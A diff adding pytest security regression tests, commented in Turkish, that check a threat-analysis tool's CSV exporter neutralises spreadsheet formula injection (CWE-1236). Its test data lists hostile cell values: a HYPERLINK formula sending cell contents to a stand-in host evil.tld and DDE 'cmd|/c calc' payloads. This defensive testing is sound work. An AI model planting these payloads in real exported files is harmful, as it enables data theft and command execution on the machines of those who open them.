@@ -25,7 +25,7 @@ matplotlib.use("Agg")
 import config
 from modules.exporters import AVAILABLE_FORMATS, EXPORTERS, ExportError, ExportPayload
 from modules.exporters import pdf_exporter as pdf_mod
-from modules.exporters.csv_exporter import CSVExporter
+from modules.exporters.csv_exporter import CSVExporter, _defuse_formula
 from modules.exporters.json_exporter import JSONExporter, _json_default
 from modules.exporters.pdf_exporter import PDFExporter
 from modules.models import GeneralStatistics, ThreatFinding, ThreatSeverity
@@ -501,6 +501,82 @@ def test_csv_export_raises_export_error_when_path_is_unwritable(
 
     with pytest.raises(ExportError):
         CSVExporter().export(payload, blocker)
+
+
+# ----------------------------------------------------------------------
+# CSV formül enjeksiyonu (CWE-1236) -- güvenlik regresyonu
+# ----------------------------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "hostile",
+    [
+        '=HYPERLINK("https://evil.tld/?d="&A1,"Ac")',
+        "+cmd|'/c calc'!A1",
+        "-2+3+cmd|'/c calc'!A1",
+        "@SUM(1+1)*cmd|'/c calc'!A1",
+        "\tzararli",
+        "\rzararli",
+    ],
+)
+def test_csv_defuses_spreadsheet_formula_cells(hostile: str):
+    """Formül olarak yorumlanabilecek hücreler tek tırnakla etkisizleştirilmeli.
+
+    Saldırgan bu metni OTX pulse etiketi olarak yazabildiği için (categories
+    sütunu serbest metindir), analistin CSV'yi Excel'de açması kod/ağ
+    isteği tetiklerdi. Kanıt SİLİNMEZ, yalnızca metne çevrilir.
+    """
+    defused = _defuse_formula(hostile)
+
+    assert defused == "'" + hostile
+    assert not defused.startswith(("=", "+", "-", "@", "\t", "\r"))
+
+
+@pytest.mark.parametrize("benign", ["192.168.1.5", "Port Scan", "example.com", ""])
+def test_csv_leaves_harmless_cells_untouched(benign: str):
+    assert _defuse_formula(benign) == benign
+
+
+@pytest.mark.parametrize("numeric", [0, -5, 1609459200.0, -0.5])
+def test_csv_does_not_defuse_numeric_cells(numeric: float):
+    """Sayılara dokunulmamalı: negatif bir sayıyı "'-5" metnine çevirmek veriyi bozar."""
+    assert _defuse_formula(numeric) == numeric
+
+
+def test_csv_threat_intel_categories_are_defused_end_to_end(
+    statistics: GeneralStatistics, capture_file: Path, tmp_path: Path
+):
+    """Uçtan uca: sağlayıcıdan gelen zararlı kategori CSV'ye zararsız yazılmalı."""
+    hostile_tag = '=HYPERLINK("https://evil.tld","x")'
+    intel = {
+        "93.184.216.34": [
+            NormalizedIOCResult(
+                source="AlienVault OTX",
+                ip="93.184.216.34",
+                is_malicious=True,
+                raw_score=3,
+                categories=(hostile_tag,),
+                last_seen=None,
+                queried_at=FIXED_QUERY_TIME,
+                provider_error_code=None,
+                provider_error_message=None,
+                confidence=None,
+            )
+        ]
+    }
+    payload = ExportPayload.build(
+        statistics=statistics,
+        findings=[],
+        threat_intel=intel,
+        source_file=capture_file,
+        analysis_duration=0.0,
+    )
+
+    rows = _read_csv(CSVExporter().export(payload, tmp_path)[1])
+
+    assert rows[0]["categories"] == "'" + hostile_tag
+    # Kanıt korunmalı: etiketin kendisi hücrede hâlâ okunabilir olmalı.
+    assert hostile_tag in rows[0]["categories"]
 
 
 # ======================================================================
